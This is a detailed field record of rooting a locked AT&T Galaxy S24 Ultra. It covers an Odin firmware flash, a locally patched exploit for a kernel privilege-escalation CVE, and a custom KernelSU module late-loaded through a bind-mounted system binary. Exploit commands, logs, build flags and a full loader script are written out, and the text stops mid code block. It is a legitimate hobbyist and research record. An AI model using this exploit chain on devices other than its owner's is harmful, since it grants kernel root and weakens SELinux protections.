# Rooting an AT&T Samsung Galaxy S24 Ultra (SM-S928U) on Android 16 with a locked bootloader

**Complete field record — Windows 11/Odin firmware change, CVE-2026-43499 bootstrap root, and Samsung-compatible KernelSU v3.2.5 late-load**  
**Experiment:** 15–16 October 2026 (Mountain Time, UTC−06:00)  
**Outcome:** Verified working **temporary** KernelSU root, driver/manager **32525/32525**, SELinux **Enforcing**, original Android `logcat` restored.  
**Hardware actually tested:** **US AT&T SM-S928U**, not the US-unlocked `SM-S928U1` used by the published reference validation.

> **Evidence convention used in this record:** **Observed** means established by this phone's reported properties, terminal results, build artifacts, or retained diagnostic logs. **External reference** identifies behavior or a firmware listing documented by another project. **Not recorded** means the actual value/action was not preserved in the available history. A typical tool procedure is not presented as if its every step had been individually captured. This record describes an accomplished experiment; it is not a claim of support for other firmware or hardware combinations.

## 1. Final result, in brief

The AT&T SM-S928U had a locked bootloader. It was flashed on a Windows 11 computer with Samsung Odin to the **AT&T `S928USQS6DZF2`** stock firmware. On a Linux Mint machine, a locally modified and built `Root-My-Galaxy-Payloads` exploit for **CVE-2026-43499** gained shell-domain bootstrap root. That privilege was used to load a custom, Samsung KDP/RKP/DEFEX-compatible **KernelSU v3.2.5** loadable kernel module. The original upstream-provided E3Q module was not stable on this particular AT&T device; a separately compiled **no-patch-text** variant succeeded. A shallow Git history originally produced driver version `30001`; restoring the full history and rebuilding produced `32525`, eliminating the Manager compatibility errors.

Final observed checks:

```text
$ adb shell 'grep -i kernelsu /proc/modules'
kernelsu 217088 0 - Live 0x0000000000000000 (O)

$ adb shell 'su -c id'
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0

$ adb shell getenforce
Enforcing

$ adb shell 'grep -F /system/bin/logcat /proc/self/mountinfo || echo "PASS: Mount removed"'
PASS: Mount removed

$ adb logcat -d -t 2
--------- beginning of main
... ordinary Android log messages ...
```

**On-device KernelSU Manager:** version **32525**, driver version **32525**, both version warnings gone; user confirmed no errors. **Root is lost on reboot**, since the kernel module was loaded into RAM after startup, not installed in a modified flashed boot image. The bootloader remained locked.

## 2. Exactly which device and firmware

| Property | Tested value / evidence |
|---|---|
| Commercial device | Samsung Galaxy S24 Ultra |
| Carrier / market | **AT&T, United States** |
| Actual model | **`SM-S928U`** |
| Internal device target | **`e3q`**, Snapdragon/Qualcomm Galaxy S24 Ultra family |
| CPU architecture | ARM64 / AArch64 |
| Android version | **16** |
| Samsung UI branch | **One UI 8.5** according to the AT&T firmware listing; on-device One UI property was not retained |
| Exact AP/PDA firmware after flashing | **`S928USQS6DZF2`** |
| Android build string | **`BP4A.251205.006.S928USQS6DZF2`** |
| Android build ID portion | `BP4A.251205.006` |
| Complete kernel release | **`6.1.145-android14-11-33419968-abS928USQS6DZF2`** |
| Linux kernel version | `6.1.145` |
| Kernel/GKI family | `android14-6.1` — the `android14` portion identifies the kernel/KMI branch, **not** Android OS version |
| Security patch | **2026-06-05** |
| Samsung binary/bootloader revision | **6**, encoded in `S928USQS6DZF2` and confirmed by AT&T firmware metadata |
| Bootloader | **Locked**, never unlocked for this procedure |
| Firmware region / CSC package | AT&T `ATT`; package includes `CSC_OYN_S928UOYN6DZF2...` |
| Root software | KernelSU **v3.2.5**, driver code **32525** |
| Root type | Late-loaded kernel module (`LKM`), **ephemeral** |
| SELinux once final KernelSU loaded | **Enforcing** |
| Kernel `su` context | `u:r:ksu:s0` |

The tested S928U's `boot.img.lz4` matched the SHA-256 of the reference DZF2 kernel package published for the `SM-S928U1`:

```text
bf212e8c0e3b39743f76f5e0802fde8ba6ca07a048135017c079207708cbbc88  boot.img.lz4
```

This **byte-for-byte boot-image evidence**, together with the exact runtime kernel release, supported using the `e3q-S928USQS6DZF2` exploit target as a starting point. It did **not** make the app's model allowlist recognize `SM-S928U`, and it did **not** establish that a prebuilt KernelSU module would work unchanged on AT&T hardware.

### 2.1 The firmware installed *before* the Odin flash

**The exact firmware and kernel that happened to be installed on this phone before flashing were not captured in the preserved transcript. They cannot honestly be reconstructed from the post-flash phone.**

There is, however, a useful dated external comparison:

| Public AT&T software around 2 October 2026 | Public record |
|---|---|
| Latest Android 16 release around that date | **`S928USQS6DZI1`** |
| Public release date | **2026-10-01**, per Samsung's official SM-S928U update history |
| Android | **16**, One UI **8.5** |
| Security patch | **2026-09-05** |
| Bootloader revision | **6** |
| Exact kernel `uname -r` for DZI1 | **Not independently established** from the available evidence |
| Whether DZI1 was actually on this particular phone | **Unknown** |

Older AT&T builds preceding that release included `S928USQS6DZH3` (August patch) and `S928USQS6DZG1` (July patch). A Samsung release dated **2026-10-01** is therefore an appropriate **historical comparator** for “roughly two weeks before the experiment,” **not an assertion about the phone's former kernel version**.

## 3. Windows 11 phase: putting the AT&T phone on the target DZF2 firmware

### 3.1 What the operator actually did

The phone was flashed **on a Windows 11 computer using Odin**, prior to moving development to Linux Mint. The chosen firmware was the **stock AT&T SM-S928U `S928USQS6DZF2` build**, rather than a U1, international, China, or Exynos image. After flashing, the device booted and its model/build/kernel/security-patch data were reported as in §2. The successful firmware change is established by that on-device identity.

The preserved archive names, originally in `Samsung Root` and later moved to `Samsung Root leftovers`, identify the supplied firmware package:

```text
SAMFW.COM_SM-S928U_ATT_S928USQS6DZF2_fac.zip

AP_S928USQS6DZF2_S928USQS6DZF2_MQB110702580_REV00_user_low_ship_MULTI_CERT_meta_OS16.tar.md5.zip
BL_S928USQS6DZF2_S928USQS6DZF2_MQB110702580_REV00_user_low_ship_MULTI_CERT.tar.md5.zip
CP_S928USQS6DZF2_CP34806429_MQB110702580_REV00_user_low_ship_MULTI_CERT.tar.md5.zip
CSC_OYN_S928UOYN6DZF2_MQB110702580_REV00_user_low_ship_MULTI_CERT.tar.md5.zip
HOME_CSC_OYN_S928UOYN6DZF2_MQB110702580_REV00_user_low_ship_MULTI_CERT.tar.md5.zip
```

A `USERDATA` archive also appeared in the Windows-flashing file inventory; its exact basename and whether Odin used it were not recovered from the retained record.

**Important distinction:** The directory containing both `CSC` and `HOME_CSC` files does **not** establish which was selected in Odin. The exact Odin release/build, Odin log or `PASS` screenshot, Download Mode screen, driver installer/version, `USERDATA` selection, and whether the flash wiped user data are **not recorded**. These details are deliberately not fabricated here.

### 3.2 Odin workflow and its correspondence to this attempt

The following is the conventional, externally documented Odin sequence applicable to the recorded firmware files. It explains the mechanics of the successful Windows stage; individual button clicks were not all logged:

1. On **Windows 11**, obtain the stock **SM-S928U, ATT, `S928USQS6DZF2`** firmware package and extract its ZIP wrapper(s) to obtain Odin-ready `.tar.md5` archives.
2. Connect the S24 Ultra in Samsung **Download Mode** by using the device's Download Mode key/USB sequence; Odin communicates with this Samsung mode rather than Fastboot.
3. Open **Odin** and confirm the handset is detected in the **ID:COM** connection field.
4. Match the extracted firmware archive categories to Odin's **BL**, **AP**, and **CP** slots. Use the matching carrier CSC image in Odin's **CSC** slot. Standard Odin offers **`CSC`** for a reset/wipe workflow and **`HOME_CSC`** for a data-preserving workflow. **Which one was actually selected here is unknown.**
5. Run the stock-firmware flash and allow the handset to boot. The known result of the performed flash was `SM-S928U` running `S928USQS6DZF2` with the exact kernel in §2.

Both the June DZF2 target and September DZI1 public firmware encode **binary revision 6**; the successful stock-firmware change did **not** require a bootloader unlock. Only the **DZF2 result** was used for the subsequent exploit and module builds.

## 4. Programs, runtimes, utilities, and projects used

This is a record of the **actual root-development toolchain**; it separates tools used for the procedure from applications whose versions were only probed later. Host component versions are taken from the operator's `ROOT_DOCUMENTATION_INFO.txt` capture.

### 4.1 Windows and on-device components

| Component | Version / identity | Role |
|---|---|---|
| Windows 11 | Edition/build not captured | Host for stock firmware flash |
| Samsung Odin | Exact Odin version not captured | Flashed stock BL/AP/CP/CSC-category firmware |
| Samsung Download Mode / Odin protocol | Device bootloader flashing mode | Allowed stock signed firmware installation despite locked bootloader |
| Samsung USB connectivity/driver | Specific Windows driver package not captured | Odin-to-device connection |
| Root My Galaxy Android app | Exact app version not captured | Initial device/profile compatibility check and manual exploit attempt |
| Shizuku | Exact version not captured | Android-side shell/service access during early investigation |
| KernelSU Manager | **v3.2.5, APK code 32525** | Granted/verified userspace superuser access and module/driver compatibility |
| Android `/system/bin/sh`, `mount`, `umount`, `sha256sum`, `logcat`, `getprop`, `grep` | Stock phone binaries | Runtime loading, restoration, and checks |

### 4.2 Linux Mint workstation

| Component | Version | Usage |
|---|---|---|
| **Linux Mint** | **22.3 Zena**, Ubuntu Noble base; x86_64 | Development workstation |
| Host Linux kernel | `7.0.0-38-generic` | Workstation OS kernel, **not** phone kernel |
| Android Platform Tools **ADB** | ADB `1.0.41`, platform-tools **37.0.0-14910828** | USB debugging, pushing files, launching remote helpers, reading status/logs |
| Git | **2.43.0** | Cloned source, pinned commits, restored complete KernelSU commit history |
| Python 3 | **3.12.3** | File inspection and source/build automation |
| GCC/G++ | **13.3.0** | Available host compilation utilities |
| Host Clang/Clang++ | **18.1.3** | Host compilation/inspection environment |
| GNU Make | **4.3** | Compiled the exploit and kernel-module targets |
| GNU Binutils (`readelf`, `nm`, `objdump`) | **2.42** | ELF/module/import inspection |
| `modinfo` / kmod | **31** | Verified `vermagic` and kernel module metadata |
| Podman | **4.9.3** | Hosted exact Android kernel DDK build environment |
| Android NDK | **r29** (`29.0.14206865`) | Cross-compiled Android ARM64 exploit and userspace helper |
| Android NDK Clang/LLVM | **21.0.0** | Target compiler/`llvm-strip` for Android userspace asset |
| Rust `rustc`, Cargo, rustup | Used; exact versions **not captured** | Built customized Android ARM64 `ksud` from KernelSU source |
| GNU Coreutils (`sha256sum`, `cp`, etc.) | **9.4** | Artifact integrity, file staging |
| `file` | **5.45** | ELF identification |
| `gzip` and archive utilities (`tar`, `unzip`, `7z`) | gzip **1.12**, tar **1.35**, UnZip **6.00**; 7z version not captured | Firmware archives and Samsung crash archives/logs |
| `lsusb` / usbutils | **017** | USB/device connection inspection |

**Relevant environment paths:**

```text
ADB:           /home/frog/adb-fastboot/platform-tools/adb
Android NDK:   /home/frog/Android/Sdk/ndk/29.0.14206865
Android SDK:   /home/frog/Android/Sdk
Project root:  /home/frog/Desktop/Tools/Samsung Root
Reroot set:    /home/frog/Desktop/Tools/Samsung Root/Reroot
Archived work: /home/frog/Desktop/Tools/Samsung Root/Samsung Root leftovers
```

**Kernel build image, exactly pinned:**

```text
ghcr.io/ylarod/ddk-min:android14-6.1-20260313
sha256:1dd6ac340b627a90a4031d6d0df6b129d8cc949b139fb56032c898f023d3d5d3
```

This container supplied the Android 14 / Linux 6.1 DDK kernel build tree and kernel-side Clang toolchain. The host Android NDK r29 supplied the Android userspace cross-compiler. They are **distinct compiler environments**.

**Programs inspected but not central to the successful route:** `fastboot` was present (Platform Tools 37.0.0), but Samsung flashing used Odin; `cmake`, `ninja`, host `lz4`, `jq`, and `rg` were not found in the later PATH survey. OpenJDK 25 was installed, but Java was not needed to produce the final root artifacts. The local Rust executable was not in PATH in the later survey, even though the build used the installed Cargo environment through `$HOME/.cargo/env`.

### 4.3 Git repositories and exact checked-out revisions

**Root My Galaxy Android application:** `BuSung-dev/Root-My-Galaxy`. The application has an exact model-plus-kernel allowlist and a separate advanced/manual mode. Its application sources were not the native payload compilation inputs.

**Root My Galaxy native payloads:** `BuSung-dev/Root-My-Galaxy-Payloads`.

```text
origin:  https://github.com/BuSung-dev/Root-My-Galaxy-Payloads.git
commit:  6e3223e689688540060ddd97a0927e927bfed207
profile: e3q-S928USQS6DZF2
local modifications: src/slide_app.c (two targeted changes)
```

**KernelSU:** `tiann/KernelSU`.

```text
origin:       https://github.com/tiann/KernelSU.git
release/tag:  v3.2.5
commit:       b0bc817b4e966aa6aa830834eaf6ef765d821d40
commit count: 2525 after full-history fetch
KSU_VERSION:  30000 + 2525 = 32525
```

The KernelSU worktree was **not pristine upstream**: Samsung patches and the adjusted late-load code were retained. Modified tracked files captured in the final inventory:

```text
kernel/Kbuild
kernel/core/init.c
kernel/feature/sucompat.c
kernel/hook/arm64/patch_memory.c
kernel/hook/arm64/syscall_hook.c
kernel/hook/syscall_hook.h
kernel/hook/syscall_hook_manager.c
kernel/hook/tp_marker.c
kernel/policy/app_profile.c
userspace/ksud/src/late_load.rs
userspace/ksud/src/utils.rs
```

Additional source introduced:

```text
kernel/compat/
kernel/include/ksu_samsung_kdp.h
```

The Samsung-specific baseline patch was obtained from the payload repository:

```text
Root-My-Galaxy-Payloads/kernelsu/patches/KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch
```

**Preserve the patched local checkout in the archived development directory** for exact reconstruction. This report preserves the file list, flags, commands, and resulting hashes, but does **not** claim to reproduce every line of the complete local KernelSU source diff from a source snapshot that was not uploaded with the final report.

## 5. The actual Linux rooting investigation and breakthrough — chronological

### Phase A — Check official app support and select the exact DZF2 target

The installed **Root My Galaxy** application initially rejected the US AT&T model. Its diagnostic log began with the precise result:

```text
[-] No compatible payload supports this model and kernel version
```

The published payload catalog had a DZF2 E3Q profile validated on **`SM-S928U1`**, whereas the handset identified itself as **`SM-S928U`**. Matching kernel numbers alone did not satisfy the app's model check. The fifth manual target shown in the app was the Galaxy S24 Ultra `6.1.145` profile for US-unlocked/Canadian variants, with identifier **`e3q-S928USQS6DZF2`**. The China `SM-S9280`, international `SM-S928B`, and other nonmatching targets were not substitutes.

The manual profile could download and verify the native payloads, but an early exploit attempt did **not** produce root. The retained app log shows an automatically repeated supervisor attempting kernel page preparation, KASLR discovery, `pselect`-based slide, and a pipe-based physical read/write primitive. Examples from that run:

```text
[+] Support profile: e3q-S928USQS6DZF2
[*] exploit verified
[*] KernelSU verified
[+] preload supervisor ... attempts=24 ...
[+] slide-kaslr-ok source=tracefs ...
[*] app fops slide attempt=1/1 triggered=0 verified=0 ...
[+] pipe-physrw-summary ... done=0 root=0 ...
```

The device subsequently rebooted during this early experimental route. A successful shell root was not established by the app.

### Phase B — Validate the exact kernel, inspect the payload source, and build a corrected stable payload

The native repository's existing target was used:

```bash
make TARGET=e3q-S928USQS6DZF2 \
  ANDROID_NDK_HOME="$HOME/Android/Sdk/ndk/29.0.14206865" stable
```

The native payload target supplied the E3Q-specific kernel offsets, layouts, P0 fingerprint, KASLR/slide routine, and physical-access/root stages. The **exact target matters**: its data were based on the same DZF2 kernel, not a generic Snapdragon 8 Gen 3 profile.

Source review found that two stable application-payload gates in **`src/slide_app.c`** checked:

```c
atomic_load(&slide_pselect_write_window)
```

while the actual successful stack-writing path signaled:

```c
atomic_load(&slide_stack_write_window)
```

The two affected checks were changed to the latter form, and the stable payload was rebuilt. The compiled Android/AArch64 shared object, renamed for deployment, was:

```text
cve-2026-43499-app.stable.so
SHA-256: 750a82852f3598f74d96037f73f22748302ab8860d1b6af54fddc276b7c3d3bc
```

The repository's Android/AArch64 bootstrap helper was also built (`cve-2026-43499-root`). Files were deployed to Android's writable, executable shell staging area:

```text
/data/local/tmp/cve43499-root
/data/local/tmp/cve43499-stable.so
```

### Phase C — Obtain bootstrap root with one controlled exploit attempt

The decisive command on the Linux host was:

```bash
adb shell 'EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=120 /data/local/tmp/cve43499-root --run-payload /data/local/tmp/cve43499-stable.so /data/local/tmp/cve43499-root /data/local/tmp/cve43499-npt-bootstrap.log'
```

The `EXPLOIT_ATTEMPTS=1` setting replaced the app's repeated-attempt supervisor with one attempt. The exploit combined a `pselect`-based stack/write window, fake file-operations pointer manipulation, pipe physical read/write, and a kernel usermode-helper pathway. The retained **successful** patched-test log contains the following highly diagnostic events:

```text
[+] exploit attempt=1/1 ...
[+] slide-kaslr-ok source=tracefs ...
[*] slide pi stage=deadlock-accepted
[*] slide pi stage=writer-return ... sched_ok=1 window=1
[*] cfi write ret=35 errno=0
[*] cfi read ret=35 errno=0
[*] phys step pipe probe found=1 ...
[*] phys step probed read done ok=1 ...
[*] phys step probed write done ok=1
[*] phys step read64 done ok=1 ...
[*] phys proof64 restore=1 ...
[*] root umh result wake=1 complete=1 retval=0 socket=1
[*] root umh selinux left=0 intended root state old=1
[*] app fops slide attempt=1/1 triggered=1 verified=1 ...
[+] pipe-physrw-summary ... done=1 root=1 kaslr=1 ...
[+] pipe physrw ... read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
[+] stability keeper ... retaining reclaimed kernel pages
[+] exploit completed attempt=1/1
```

The physical-access read/write proofs included **restoration** of the scratch values; the kernel exploit established `uid 2000 → 0`. A subsequent root-helper execution independently confirmed bootstrap privilege:

```bash
adb shell '/data/local/tmp/cve43499-root -c "id; getenforce"'
```

Observed result at this **bootstrap** stage:

```text
uid=0(root) ... context=u:r:kernel:s0
Permissive
```

This temporary bootstrap environment is **not** the final KernelSU `su` environment. The exploit's intended intermediate state lowered SELinux enforcement so it could launch the privileged userspace module loader. Later KernelSU activation restored the normal Enforcing result.

### Phase D — Test the published Samsung E3Q KernelSU artifacts; diagnose kernel failures

The payload repository also supplied a Samsung-adapted KernelSU v3.2.5 pair:

```text
kernelsu/android14-6.1_kernelsu-e3q-S928USQS6DZF2-kdp.ko
kernelsu/ksud-e3q-S928USQS6DZF2-kdp
```

The published loader checksum checked in this session was:

```text
10c1bf87f8e475e6ab8c5d1c5a085aa1544ee091f4451ad65141ea75261ab610
```

Using bootstrap root to late-load that original driver did **not** produce a stable working environment on the AT&T phone. Two important Samsung crash diagnostics were preserved:

**15 October, ~21:54 — kernel panic (KP):**

```text
... Kernel panic - not syncing: Oops: Fatal exception
PC is at try_module_get+0x2c/0x1ac
```

This pointed at a module/fops-related failure while the kernel was interacting with the experimental loading/hooking path. The available log is insufficient to assign one definitive source line as the cause.

**15 October, ~22:32 — watchdog/ramdump (WP):**

```text
... [logcat:...] KernelSU: patch syscall 42, ... -> ...
... watchdog reset / watchdog bite diagnostics ...
```

The last relevant message appeared while the original KernelSU implementation was live-patching a syscall hook. **The evidence made live kernel text modification a strong suspect, not a mathematically proven singular cause.** The recovery logs also showed that the phone was still on the exact DZF2 firmware.

**Key lesson of this stage:** The fact that an E3Q `.ko` had matching kernel-release metadata and an existing successful U1 reference test did not guarantee it would be stable on this particular locked AT&T S928U runtime.

### Phase E — Build a Samsung-adapted KernelSU module without live kernel-text patching

KernelSU v3.2.5 was cloned and checked out at:

```text
b0bc817b4e966aa6aa830834eaf6ef765d821d40
```

The repository's Samsung KDP/RKP/DEFEX compatibility patch was applied, and an additional **no-patch-text** configuration/source path was selected. The important build flags were:

```make
CONFIG_KSU=m
CONFIG_KSU_SAMSUNG_KDP=y
CONFIG_KSU_SAMSUNG_RKP=y
CONFIG_KSU_SAMSUNG_DEFEX=y
CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y
```

The module was compiled inside the pinned Android 14 / Linux 6.1 DDK container with Clang. Its generated kernel release files were set to **the exact phone kernel**, not just `6.1.145`:

```bash
TARGET='6.1.145-android14-11-33419968-abS928USQS6DZF2'
printf '#define UTS_RELEASE "%s"\n' "$TARGET" > "$KDIR/include/generated/utsrelease.h"
printf '%s\n' "$TARGET" > "$KDIR/include/config/kernel.release"

CONFIG_KSU=m \
CONFIG_KSU_SAMSUNG_KDP=y \
CONFIG_KSU_SAMSUNG_RKP=y \
CONFIG_KSU_SAMSUNG_DEFEX=y \
CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y \
CC=clang make -j4
```

The actual container was launched using the project as a bind mount, offline after retrieving the image:

```bash
podman run --rm --network=none \
  -v "$KSU:/workspace" \
  -w /workspace/kernel \
  ghcr.io/ylarod/ddk-min:android14-6.1-20260313 \
  bash -euc '... DDK kernel-release setup and CONFIG_KSU build above ...'
```

The compiled `kernelsu.ko` matched this module ABI metadata:

```text
6.1.145-android14-11-33419968-abS928USQS6DZF2 SMP preempt mod_unload modversions aarch64
```

Static inspection established that the **no-patch-text** build no longer imported `stop_machine`, an important difference from the original variant. The original Samsung module and new module had different undefined-import sets, requiring the late loader to resolve the new module's imports. The final module had an **empty `__versions` section** and used the KernelSU Samsung/manual relocation pathway; this was an intentional feature of this symbol-trimmed target rather than evidence of a normal `insmod`-compatible module.

The module was stripped for embedding in the **`android14-6.1_kernelsu.ko`** asset slot inside the `ksud` source tree:

```text
KernelSU-v3.2.5/userspace/ksud/bin/aarch64/android14-6.1_kernelsu.ko
```

This embedded asset is crucial: the userspace binary deployed on the handset is **not merely a generic upstream `ksud` executable**. It incorporates the exact custom kernel-module bytes used by the device-specific late loader.

### Phase F — Build a compatible Android ARM64 `ksud` and create a late-load entry point

Rust and Cargo were installed for the custom userspace build. The project used Android NDK r29, Android API level **35** for the ARM64 build target, and the KernelSU Rust setup script:

```bash
source "$HOME/.cargo/env"
export ANDROID_NDK_HOME="$HOME/Android/Sdk/ndk/29.0.14206865"
source "$KSU/.github/scripts/setup-rust-build.sh" aarch64-linux-android 35

cd "$KSU"
cargo build --locked --release --target aarch64-linux-android -p ksud
```

A Rust Git dependency could not be fetched directly from its historical upstream address (`Kernel-SU/adb_client`). A local project-specific Git redirect configuration resolved it during the build:

```text
~/Desktop/Samsung Root/ksu-git-redirects.conf   (original working location)
```

The custom `ksud` executable was an Android/AArch64 ELF PIE dynamically linked through **`/system/bin/linker64`**, with the stripped custom `.ko` embedded. It was deployed to `/data/local/tmp` rather than flashed to a boot partition.

An additional runtime integration mismatch arose: the payload repository's convenience root helper invoked `late-load` with **`--ephemeral`**, whereas the locally built KernelSU v3.2.5 userspace CLI expected **`late-load --allow-shell`**. The direct convenience option exited with:

```text
error: unexpected argument '--ephemeral' found
Usage: logcat late-load [OPTIONS]
```

The working alternative was a small **Android shell script** executing `ksud late-load --allow-shell` from the bootstrap-root context. To place the loader at the executable path expected by the invocation, the script temporarily **bind-mounted the actual `ksud` binary over `/system/bin/logcat`**. This did not replace the stock system file on disk; unmounting later restored the stock executable.

### Phase G — First successful KernelSU load, followed by a version mismatch

With bootstrap root, the initial no-patch-text loader was run via the root helper:

```bash
adb shell '/data/local/tmp/cve43499-root -c "sh /data/local/tmp/s928u-late-load-once.sh"'
```

Its output reached:

```text
===== VERIFY ROOT =====
===== VERIFY LOADER =====
===== PREPARE LOADER =====
===== BIND LOADER =====
===== LOAD KERNELSU =====
```

The command did not immediately print the script's final exit-code line, but the phone stayed responsive. Independent checks proved KernelSU had loaded:

```text
kernelsu ... - Live ...
uid=0(root) ... context=u:r:ksu:s0
Enforcing
```

KernelSU Manager v3.2.5 was installed and recognized a functioning driver, but showed two errors:

```text
manager version (32525) and kernelsu driver version (30001) mismatch

the kernelsu version 30001 is too low for the manager to work properly.
Please upgrade to version 32523 or higher
```

The reason was found in KernelSU's `kernel/Kbuild`: it computes the driver version from its Git history, essentially

```make
KSU_VERSION = 30000 + $(git rev-list --count HEAD)
```

The KernelSU source had originally been obtained as a **one-commit shallow clone**, so the first locally compiled module reported **`30001`**, despite originating from the **v3.2.5** source revision. This was a version-metadata/build-environment issue, not proof that a different release had been compiled.

### Phase H — Restore the full Git history, rebuild 32525, activate on a fresh boot

The corrective Git command was:

```bash
git -C "$KSU" fetch --unshallow origin
```

Verification:

```text
$ git -C "$KSU" rev-parse --short HEAD
b0bc817b

$ git -C "$KSU" rev-list --count HEAD
2525

$ echo $((30000 + 2525))
32525
```

The existing Samsung and no-patch-text source changes **remained present**. The kernel-module objects were cleaned and rebuilt, the final `.ko` was embedded into the asset slot, and the **Rust `ksud` package was cleaned and rebuilt** to force inclusion of the new asset:

```bash
# Within the DDK container (with the exact kernel-release settings above):
make -C "$KDIR" M=/workspace/kernel src=/workspace/kernel clean
CONFIG_KSU=m CONFIG_KSU_SAMSUNG_KDP=y CONFIG_KSU_SAMSUNG_RKP=y \
CONFIG_KSU_SAMSUNG_DEFEX=y CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y \
CC=clang make -j4

# On Linux host after copying and stripping the .ko to the userspace asset:
cargo clean -p ksud
cargo build --locked --release --target aarch64-linux-android -p ksud
```

The final loader binary was retained separately from the earlier functioning but version-mismatched one. Its checksum was verified **both on the host and on the phone**:

```text
0404476629471d26233721f0a65a90f6fa57f4105416079dd91597027338e3fb
```

The new loader was staged at:

```text
/data/local/tmp/ksud-s25u-kdp-v32525
```

**Historical naming note:** `s25u` is a leftover loader-path convention; this binary was **built for this S24 Ultra `SM-S928U`, `android14-6.1`, DZF2 kernel**, not for an actual Galaxy S25 Ultra.

The phone was rebooted to unload the earlier `30001` module, the one-shot bootstrap exploit was rerun successfully, and the new **v32525** loader was executed through a version-specific copy of the successful late-load script:

```bash
adb shell '/data/local/tmp/cve43499-root -c "sh /data/local/tmp/s928u-v32525-late-load-once.sh"'
```

Again the script output reached `===== LOAD KERNELSU =====`, while the independent module and `su` tests succeeded. At that point the `/system/bin/logcat` bind mount remained active:

```text
... /local/tmp/ksud-s25u-kdp-v32525 /system/bin/logcat ...
```

It was explicitly removed using KernelSU root:

```bash
adb shell 'su -c "umount /system/bin/logcat"'
```

Normal Android `logcat` operation returned. KernelSU continued to grant `uid=0(root)` in `u:r:ksu:s0` with SELinux **Enforcing**. The user opened Manager and confirmed **driver 32525**, **manager 32525**, **no errors**. That constitutes the completed successful device test.

## 6. Exact final artifacts and hashes

The following names and checksums correspond to the final files preserved for rerooting. Their folder was subsequently moved from `~/Desktop/Samsung Root/Reroot/` to:

```text
/home/frog/Desktop/Tools/Samsung Root/Reroot/
```

| Artifact | Purpose | SHA-256 |
|---|---|---|
| `cve43499-root` | ARM64 exploit runner and bootstrap-root `-c` launcher | `54894e9bfa80fc36cfa03bd4ec4279e1d56eccc9719c9ee395b64ffd6792866b` |
| `cve43499-stable.so` | Locally fixed `e3q-S928USQS6DZF2` CVE-2026-43499 payload | `750a82852f3598f74d96037f73f22748302ab8860d1b6af54fddc276b7c3d3bc` |
| `ksud-s25u-kdp-v32525` | Custom Android ARM64 KernelSU v32525 loader with embedded no-patch-text module | `0404476629471d26233721f0a65a90f6fa57f4105416079dd91597027338e3fb` |
| `s928u-v32525-late-load-once.sh` | Exact loader integrity check and late-load script | `e8dfbf44d3a94a6768d222bd60b80002b89cc1066e04608e9acf0f9e095e0ff0` |

Additional important compiler output in the archived source tree:

```text
Samsung Root leftovers/KernelSU-v3.2.5/kernel/kernelsu.ko
SHA-256 003a4ee7506545a918cf11a8fd37d7eea2bc0a1d421ed8262092a0eb3ec1ff6e
vermagic 6.1.145-android14-11-33419968-abS928USQS6DZF2 SMP preempt mod_unload modversions aarch64
```

The `.ko` is not a substitute for the correctly built/embedded `ksud` loader. **No working binaries are attached to this Markdown document**; the hashes identify the operator's separately held files. Someone downloading only this document must obtain/build the relevant code and preserve the custom modifications; simply downloading upstream KernelSU v3.2.5 or a generic `ksud` executable does not recreate this build.

### 6.1 Exact final late-load shell script

The final script's source, as recorded in the post-experiment file listing:

```sh
#!/system/bin/sh

LOADER=/data/local/tmp/ksud-s25u-kdp-v32525
EXPECTED=0404476629471d26233721f0a65a90f6fa57f4105416079dd91597027338e3fb

echo "===== VERIFY ROOT ====="
[ "$(id -u)" = "0" ] || {
    echo "STOP: Bootstrap root unavailable"
    exit 1
}

echo "===== VERIFY LOADER ====="
ACTUAL=$(sha256sum "$LOADER" | cut -d' ' -f1)
[ "$ACTUAL" = "$EXPECTED" ] || {
    echo "STOP: Loader hash mismatch"
    exit 1
}

if grep -qi kernelsu /proc/modules; then
    echo "STOP: KernelSU already loaded"
    exit 1
fi

echo "===== PREPARE LOADER ====="
cp "$LOADER" /data/local/tmp/.ksud-stage || exit 1
chmod 755 /data/local/tmp/.ksud-stage

echo "===== BIND LOADER ====="
mount -o bind "$LOADER" /system/bin/logcat || exit 1
trap 'umount /system/bin/logcat 2>/dev/null || true' 0

echo "===== LOAD KERNELSU ====="
RUST_LOG=info /system/bin/logcat late-load --allow-shell
RESULT=$?

echo "===== LOADER EXIT CODE: $RESULT ====="
exit "$RESULT"
```

The copy to `.ksud-stage` is made by the script, but the actual **bind mount uses `$LOADER`**. The trapped cleanup only runs if the shell process completes; in both successful tests the loader reached its running state while the bind mount was still present, so it was separately unmounted after `su` worked.

## 7. Re-establishing the tested root after a normal reboot

This is the documented reproduction path **using the exact already-built files** for the **same model, firmware and kernel**. It does not rebuild the exploit or custom module.

From a Linux host with authorized ADB debugging:

```bash
cd "$HOME/Desktop/Tools/Samsung Root/Reroot"

adb devices
adb shell 'getprop ro.product.model; getprop ro.build.version.incremental; uname -r'
```

The model and kernel must match **`SM-S928U`** and **`6.1.145-android14-11-33419968-abS928USQS6DZF2`**; the build must identify **`S928USQS6DZF2`**.

Stage the four preserved files under the names expected by the helper and script:

```bash
adb push cve43499-root /data/local/tmp/cve43499-root
adb push cve43499-stable.so /data/local/tmp/cve43499-stable.so
adb push ksud-s25u-kdp-v32525 /data/local/tmp/ksud-s25u-kdp-v32525
adb push s928u-v32525-late-load-once.sh /data/local/tmp/s928u-v32525-late-load-once.sh
adb shell 'chmod 755 /data/local/tmp/cve43499-root /data/local/tmp/ksud-s25u-kdp-v32525'
```

Run the tested **one-attempt** bootstrap command:

```bash
adb shell 'EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=120 /data/local/tmp/cve43499-root --run-payload /data/local/tmp/cve43499-stable.so /data/local/tmp/cve43499-root /data/local/tmp/cve43499-reroot.log'
```

Check the bootstrap helper before loading a driver:

```bash
adb shell '/data/local/tmp/cve43499-root -c "id; getenforce"'
```

If bootstrap root was established, load the already-tested **32525** KernelSU binary **once**:

```bash
adb shell '/data/local/tmp/cve43499-root -c "sh /data/local/tmp/s928u-v32525-late-load-once.sh"'
```

This call can remain occupied at `===== LOAD KERNELSU =====` while the module has already loaded. Check from another terminal rather than interpreting a non-return as automatic failure:

```bash
